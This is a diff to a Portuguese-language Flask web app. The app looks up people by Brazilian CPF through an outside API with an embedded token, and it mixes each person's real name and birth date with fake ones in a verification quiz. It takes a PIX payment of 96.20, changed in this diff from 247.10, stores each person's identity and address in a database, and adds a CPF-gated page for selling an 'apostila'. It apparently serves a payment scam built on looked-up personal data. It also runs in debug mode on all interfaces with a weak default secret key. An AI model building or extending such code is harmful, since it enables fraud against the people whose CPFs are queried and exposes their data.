@@ -5,16 +5,31 @@ import random
 from datetime import datetime, timedelta
 from typing import Dict, Any
 from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy.orm import DeclarativeBase
 
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
+class Base(DeclarativeBase):
+    pass
+
+db = SQLAlchemy(model_class=Base)
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
 app.static_folder = 'static'
 
-API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
+# Configure o SQLAlchemy
+app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL", "sqlite:///users.db")
+app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
+    "pool_recycle": 300,
+    "pool_pre_ping": True,
+}
+db.init_app(app)
+
+# Importe os modelos após inicializar o db
+from models import Usuario
 
 # Mapeamento de estados para siglas
 ESTADOS = {
@@ -100,21 +115,26 @@ def gerar_nomes_falsos(nome_real: str) -> list:
     return todos_nomes
 
 def gerar_datas_falsas(data_real: str) -> list:
-    data_real = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
-    datas_falsas = []
+    try:
+        # Converte a string de data para objeto datetime
+        data_real_obj = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
+        datas_falsas = []
 
-    # Gera duas datas falsas próximas à data real
-    for _ in range(2):
-        dias = random.randint(-365*2, 365*2)  # ±2 anos
-        data_falsa = data_real + timedelta(days=dias)
-        datas_falsas.append(data_falsa)
+        # Gera duas datas falsas próximas à data real
+        for _ in range(2):
+            dias = random.randint(-365*2, 365*2)  # ±2 anos
+            data_falsa = data_real_obj + timedelta(days=dias)
+            datas_falsas.append(data_falsa)
 
-    # Adiciona a data real e embaralha
-    todas_datas = datas_falsas + [data_real]
-    random.shuffle(todas_datas)
+        # Adiciona a data real e embaralha
+        todas_datas = datas_falsas + [data_real_obj]
+        random.shuffle(todas_datas)
 
-    # Formata as datas no padrão brasileiro
-    return [data.strftime('%d/%m/%Y') for data in todas_datas]
+        # Formata as datas no padrão brasileiro
+        return [data.strftime('%d/%m/%Y') for data in todas_datas]
+    except Exception as e:
+        logger.error(f"Erro ao gerar datas falsas: {str(e)}")
+        return []
 
 @app.route('/consultar_cpf', methods=['POST'])
 def consultar_cpf():
@@ -417,25 +437,45 @@ def index():
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
 
     try:
+        # Salvar dados do usuário no banco
+        endereco = user_data.get('endereco', {})
+        usuario = Usuario(
+            nome_completo=user_data['nome_real'],
+            cpf=''.join(filter(str.isdigit, user_data['cpf'])),
+            email=user_data.get('email', ''),
+            telefone=user_data.get('phone', ''),
+            cep=endereco.get('cep', ''),
+            logradouro=endereco.get('logradouro', ''),
+            numero=endereco.get('numero', ''),
+            complemento=endereco.get('complemento', ''),
+            bairro=endereco.get('bairro', ''),
+            cidade=endereco.get('cidade', ''),
+            estado=endereco.get('estado', ''),
+            realizou_pagamento=True
+        )
+
+        db.session.add(usuario)
+        db.session.commit()
+
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'], 
-            'email': user_data.get('email', generate_random_email()), 
+            'name': user_data['nome_real'],
+            'email': user_data.get('email', generate_random_email()),
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), 
-            'amount': 247.10  
+            'phone': user_data.get('phone', generate_random_phone()),
+            'amount': 96.20
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
         return render_template('pagamento.html',
                            pix_data=pix_data,
-                           valor_total="247,10",
+                           valor_total="96,20",
                            current_year=datetime.now().year)
 
     except Exception as e:
@@ -448,7 +488,7 @@ def pagamento_categoria():
     user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return redirect(url_for('index'))
+        return redirect(url_for('obrigado'))
 
     categoria = request.form.get('categoria')
     if not categoria:
@@ -507,11 +547,45 @@ def categoria(tipo):
                          current_year=datetime.now().year,
                          user_data=user_data)
 
+@app.route('/apostila', methods=['GET'])
+def apostila():
+    return render_template('apostila.html', current_year=datetime.now().year)
+
+@app.route('/consultar_apostila', methods=['POST'])
+def consultar_apostila():
+    cpf = request.form.get('cpf', '').strip()
+    cpf_numerico = ''.join(filter(str.isdigit, cpf))
+
+    if not cpf_numerico or len(cpf_numerico) != 11:
+        flash('CPF inválido. Por favor, digite um CPF válido.')
+        return redirect(url_for('apostila'))
+
+    try:
+        usuario = Usuario.query.filter_by(cpf=cpf_numerico, realizou_pagamento=True).first()
+        if usuario:
+            return render_template('comprar_apostila.html',
+                               usuario=usuario,
+                               current_year=datetime.now().year)
+        else:
+            flash('CPF não encontrado ou pagamento não realizado.')
+            return redirect(url_for('apostila'))
+
+    except Exception as e:
+        logger.error(f"Erro na consulta: {str(e)}")
+        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('apostila'))
+
 def generate_random_email():
     return f"user_{random.randint(1,1000)}@example.com"
 
 def generate_random_phone():
     return f"55119{random.randint(10000000,99999999)}"
+
+# Criar as tabelas do banco de dados
+with app.app_context():
+    db.create_all()
+
+API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
